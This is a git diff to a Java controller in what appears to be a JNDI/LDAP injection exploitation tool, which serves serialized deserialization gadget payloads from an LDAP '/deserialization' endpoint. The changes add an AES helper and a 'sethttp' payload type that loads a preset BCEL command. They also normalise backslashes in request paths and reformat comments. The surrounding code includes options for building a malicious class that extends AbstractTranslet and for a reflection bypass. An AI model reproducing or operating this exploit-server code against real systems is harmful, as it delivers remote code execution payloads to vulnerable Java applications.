@@ -1,5 +1,6 @@
 package com.qi4l.jndi.controllers;
 
+import com.qi4l.jndi.controllers.utils.AESUtils;
 import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.exceptions.IncorrectParamsException;
 import com.qi4l.jndi.exceptions.UnSupportedGadgetTypeException;
@@ -19,21 +20,25 @@ import org.apache.commons.cli.Options;
 
 import java.io.ByteArrayOutputStream;
 
+import static com.qi4l.jndi.gadgets.Config.Config.AESkey;
+import static com.qi4l.jndi.gadgets.Config.Config.BCEL1;
+import static com.qi4l.jndi.gadgets.utils.Utils.base64Decode;
 import static org.fusesource.jansi.Ansi.ansi;
 
 @LdapMapping(uri = {"/deserialization"})
 public class SerializedDataController implements LdapController {
-    private              String  gadgetType;
+    private              String      gadgetType;
     private              PayloadType payloadType;
     private              String[]    params;
     public static        CommandLine cmdLine;
     private static final int         USAGE_CODE = 64;
 
     /**
-     发送LDAP结果和重定向URL
-     @param result InMemoryInterceptedSearchResult类型的结果
-     @param base 基本远程参考负载字符串
-     @throws Exception 异常
+     * 发送LDAP结果和重定向URL
+     *
+     * @param result InMemoryInterceptedSearchResult类型的结果
+     * @param base   基本远程参考负载字符串
+     * @throws Exception 异常
      */
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
@@ -44,9 +49,9 @@ public class SerializedDataController implements LdapController {
             // 获取与载荷类型相关的有效负载类
             final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(String.valueOf(gadgetType));
             // 实例化有效负载对象
-            ObjectPayload                        payload      = payloadClass.newInstance();
+            ObjectPayload payload = payloadClass.newInstance();
             // 获取有效负载的对象
-            Object                               object       = payload.getObject(payloadType, params);
+            Object object = payload.getObject(payloadType, params);
 
             ByteArrayOutputStream out   = new ByteArrayOutputStream();
             byte[]                bytes = Serializer.serialize(object, out);
@@ -64,17 +69,19 @@ public class SerializedDataController implements LdapController {
     }
 
     /**
-     处理传入的参数 base
-     @param base 传入的参数
-     @throws UnSupportedPayloadTypeException 不支持的载荷类型异常
-     @throws IncorrectParamsException 错误的参数异常
-     @throws UnSupportedGadgetTypeException 不支持的 Gadget 类型异常
+     * 处理传入的参数 base
+     *
+     * @param base 传入的参数
+     * @throws UnSupportedPayloadTypeException 不支持的载荷类型异常
+     * @throws IncorrectParamsException        错误的参数异常
+     * @throws UnSupportedGadgetTypeException  不支持的 Gadget 类型异常
      */
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
         try {
+            base = base.replace('\\','/');
             // 获取第一个斜杠的索引
-            int firstIndex  = base.indexOf("/");
+            int firstIndex = base.indexOf("/");
             // 获取第二个斜杠的索引
             int secondIndex = base.indexOf("/", firstIndex + 1);
             try {
@@ -97,12 +104,17 @@ public class SerializedDataController implements LdapController {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
             }
 
+            if (payloadType == PayloadType.sethttp) {
+                params = new String[]{BCEL1};
+                System.out.println("[+] command：" + BCEL1);
+            }
+
             // 如果载荷类型为 nu1r，则执行以下语句块
             if (payloadType == PayloadType.command) {
                 String cmd11 = Util.getCmdFromBase(base);
                 if (cmd11.contains("#")) {
-                    String[] cmd11s    = cmd11.split("#");
-                    String[] cmd12s    = cmd11s[1].split(" ");
+                    String[] cmd11s  = cmd11.split("#");
+                    String[] cmd12s  = cmd11s[1].split(" ");
                     Options  options = new Options();
                     options.addOption("a", "AbstractTranslet", false, "恶意类是否继承 AbstractTranslet");
                     options.addOption("o", "obscure", false, "使用反射绕过");
